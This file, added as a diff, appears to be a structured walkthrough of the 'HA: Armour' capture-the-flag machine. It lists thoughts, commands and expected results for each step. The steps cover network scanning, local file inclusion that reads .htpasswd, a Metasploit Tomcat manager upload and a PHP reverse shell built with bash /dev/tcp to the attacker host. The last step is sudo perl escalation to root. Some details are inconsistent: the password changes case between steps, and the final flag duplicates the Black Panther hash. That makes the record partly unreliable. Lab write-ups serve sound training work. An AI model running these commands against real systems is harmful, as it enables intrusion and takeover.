@@ -1,0 +1,137 @@
+{
+    "initial_prompt": "The 'HA: Armour' CTF challenge tasks players with recovering five stolen Avengers armours (HulkBuster, Spiderman, Ant-Man, Black Panther, and Iron Man) hidden by Klaw on a target machine (192.168.1.101). The attacker's machine is 192.168.1.102. Klaw has a habit of dividing passwords into three parts stored in different locations. The final objective is to gain root access and retrieve the last armour.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Discover active hosts on the local network to confirm the target IP address.",
+            "command": "sudo netdiscover -r 192.168.1.0/24",
+            "result": "Netdiscover scans the 192.168.1.0/24 range. The target machine 192.168.1.101 should be listed among the active hosts, confirming its presence on the network."
+        },
+        {
+            "step_number": 2,
+            "thought": "Scan the target machine for all open TCP ports, OS, service versions, and run default scripts.",
+            "command": "nmap -p- -A 192.168.1.101",
+            "result": "Nmap scan reveals open ports: 80/tcp (HTTP - Apache httpd 2.4.29), 8009/tcp (AJP - Apache Jserv), 8080/tcp (HTTP - Apache Tomcat 9.0.24), and 65534/tcp (SSH - OpenSSH 7.6p1)."
+        },
+        {
+            "step_number": 3,
+            "thought": "Attempt to connect to the SSH service on port 65534 to check for banners or pre-auth information.",
+            "command": "ssh 192.168.1.101 -p 65534",
+            "result": "Connection attempt to SSH on port 65534. A banner or message before authentication reveals the first armour: 'HulkBuster Armour: {7BDA7019C06B53AEFC8EE95D2CDACCAA}' and the first password hint: 'the Olympics'. The connection will likely fail full authentication without credentials."
+        },
+        {
+            "step_number": 4,
+            "thought": "Fetch the main page content from the HTTP service on port 80 to look for clues.",
+            "command": "curl http://192.168.1.101",
+            "result": "HTML content of the main page is retrieved. Viewing the source code (e.g., `curl http://192.168.1.101 | grep '<!--'`) reveals a comment: `<!--armour, 69 and notes.txt-->`. This suggests 'armour' as a potential username, UDP port 69, and a file 'notes.txt'."
+        },
+        {
+            "step_number": 5,
+            "thought": "Scan UDP port 69 on the target based on the hint from the webpage source code.",
+            "command": "sudo nmap -sU -p69 192.168.1.101",
+            "result": "Nmap UDP scan confirms port 69/udp is open and running TFTP (Trivial File Transfer Protocol)."
+        },
+        {
+            "step_number": 6,
+            "thought": "Use TFTP to download the 'notes.txt' file from the target machine.",
+            "command": "tftp 192.168.1.101 -c \"get notes.txt\"",
+            "result": "The file 'notes.txt' is downloaded from the TFTP server to the current directory on the attacker's machine."
+        },
+        {
+            "step_number": 7,
+            "thought": "Read the content of the downloaded 'notes.txt' file.",
+            "command": "cat notes.txt",
+            "result": "Contents of notes.txt: 'Spiderman Armour: {6D5D8D420F254C56A69E16C1E5A135F6}' and the second password hint: 'maybeevena'."
+        },
+        {
+            "step_number": 8,
+            "thought": "Enumerate directories and PHP files on the web server (port 80).",
+            "command": "dirb http://192.168.1.101/ -X .php",
+            "result": "Dirb scan discovers `http://192.168.1.101/file.php`. Other common files/directories might also be listed."
+        },
+        {
+            "step_number": 9,
+            "thought": "Test the discovered 'file.php' for Local File Inclusion (LFI) by attempting to read '/etc/apache2/.htpasswd'.",
+            "command": "curl \"http://192.168.1.101/file.php?file=/etc/apache2/.htpasswd\"",
+            "result": "The content of '/etc/apache2/.htpasswd' is retrieved. It reveals a hashed password for a user 'aarti', the third armour: 'Ant-Man Armour: {D37FB3BBC0DA42FAA2C3AB2F54F6CF54}', and the third password hint: 'StarBucks'. Combined password: 'theOlympicsmaybeevenaStarBucks'."
+        },
+        {
+            "step_number": 10,
+            "thought": "Use Metasploit to exploit the Apache Tomcat Manager service on port 8080 with the username 'armour' and the combined password.",
+            "command": "msfconsole -q -x \"use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.1.101; set RPORT 8080; set HTTPUSERNAME armour; set HTTPPASSWORD TheOlympicsmaybeevenaStarBucks; set LHOST 192.168.1.102; exploit\"",
+            "result": "Metasploit successfully exploits Tomcat Manager by uploading a payload. A Meterpreter session as the 'tomcat' user is established and becomes active."
+        },
+        {
+            "step_number": 11,
+            "thought": "Within the Meterpreter session, open a system shell to run standard Linux commands for network enumeration.",
+            "command": "shell",
+            "result": "A standard system shell is opened on the target machine via the Meterpreter session. Subsequent commands like `netstat -antp` can be run in this shell. Running `netstat -antp` (in the new shell) reveals a service listening on 127.0.0.1:8081. (Type `exit` to return to meterpreter prompt after running netstat)."
+        },
+        {
+            "step_number": 12,
+            "thought": "Forward the internal service on target's 127.0.0.1:8081 to the attacker's machine using Meterpreter's port forwarding.",
+            "command": "portfwd add -l 8081 -p 8081 -r 127.0.0.1",
+            "result": "Meterpreter sets up port forwarding. The target's internal service on 127.0.0.1:8081 is now accessible on the attacker's machine at `http://127.0.0.1:8081` (or 0.0.0.0:8081)."
+        },
+        {
+            "step_number": 13,
+            "thought": "Access the forwarded service on the attacker's local port 8081 to find the next armour.",
+            "command": "curl http://127.0.0.1:8081",
+            "result": "Accessing the forwarded service reveals a webpage or data containing the fourth armour: 'Black Panther Armour: {E828BD383DAF529D986A8E645F8F6F75}'."
+        },
+        {
+            "step_number": 14,
+            "thought": "Modify '/etc/apache2/apache2.conf' on the target via Meterpreter to set Apache User and Group to 'aarti'. This requires write permissions for 'tomcat' user and 'sed' utility on target.",
+            "command": "execute -f \"sed -i -e 's/User ${APACHE_RUN_USER}/User aarti/g' -e 's/Group ${APACHE_RUN_GROUP}/Group aarti/g' /etc/apache2/apache2.conf\"",
+            "result": "Apache configuration file `/etc/apache2/apache2.conf` is modified on the target to attempt to run Apache processes as user 'aarti' and group 'aarti'. This assumes standard Debian/Ubuntu Apache environment variables; actual values might differ."
+        },
+        {
+            "step_number": 15,
+            "thought": "Create a PHP reverse shell script ('shell.php') on the attacker machine, configured to connect back to the attacker's IP (192.168.1.102) on port 1234.",
+            "command": "echo '<?php exec(\"/bin/bash -c \\'bash -i >& /dev/tcp/192.168.1.102/1234 0>&1\\'\"); ?>' > shell.php",
+            "result": "PHP reverse shell script `shell.php` is created in the current directory on the attacker machine."
+        },
+        {
+            "step_number": 16,
+            "thought": "Upload the created 'shell.php' to the webroot ('/var/www/html/') on the target machine using Meterpreter.",
+            "command": "upload shell.php /var/www/html/shell.php",
+            "result": "'shell.php' is uploaded from the attacker's machine to '/var/www/html/shell.php' on the target."
+        },
+        {
+            "step_number": 17,
+            "thought": "Reboot the target machine via Meterpreter to apply the 'apache2.conf' changes, so Apache starts as user 'aarti'.",
+            "command": "reboot",
+            "result": "The target machine is instructed to reboot. The Meterpreter session will be lost."
+        },
+        {
+            "step_number": 18,
+            "thought": "Set up a Netcat listener on the attacker machine to catch the reverse shell connection from 'aarti'.",
+            "command": "nc -lvnp 1234",
+            "result": "Netcat listener started on port 1234 on the attacker machine, waiting for an incoming connection."
+        },
+        {
+            "step_number": 19,
+            "thought": "After the target machine has rebooted, trigger the uploaded 'shell.php' by accessing it via a web browser or curl.",
+            "command": "curl http://192.168.1.101/shell.php",
+            "result": "The request to 'shell.php' executes the script on the target. A reverse shell connection is established back to the Netcat listener, providing a shell as user 'aarti'."
+        },
+        {
+            "step_number": 20,
+            "thought": "In the 'aarti' user shell, check for sudo privileges.",
+            "command": "sudo -l",
+            "result": "The output of `sudo -l` indicates that user 'aarti' can run `/usr/bin/perl` as root without a password: `(root) NOPASSWD: /usr/bin/perl`."
+        },
+        {
+            "step_number": 21,
+            "thought": "Escalate privileges to root using the permitted sudo Perl command.",
+            "command": "sudo /usr/bin/perl -e 'exec \"/bin/bash\";'",
+            "result": "A root shell is obtained. Running `id` in this new shell confirms `uid=0(root)`."
+        },
+        {
+            "step_number": 22,
+            "thought": "In the root shell, navigate to the '/root' directory and read the 'final.txt' file to retrieve the last armour.",
+            "command": "cat /root/final.txt",
+            "result": "The contents of `final.txt` are displayed, revealing an ASCII art banner and the fifth armour: 'Iron Man Armour: {E828BD383DAF529D986A8E645F8F6F75}'. Challenge completed."
+        }
+    ]
+}
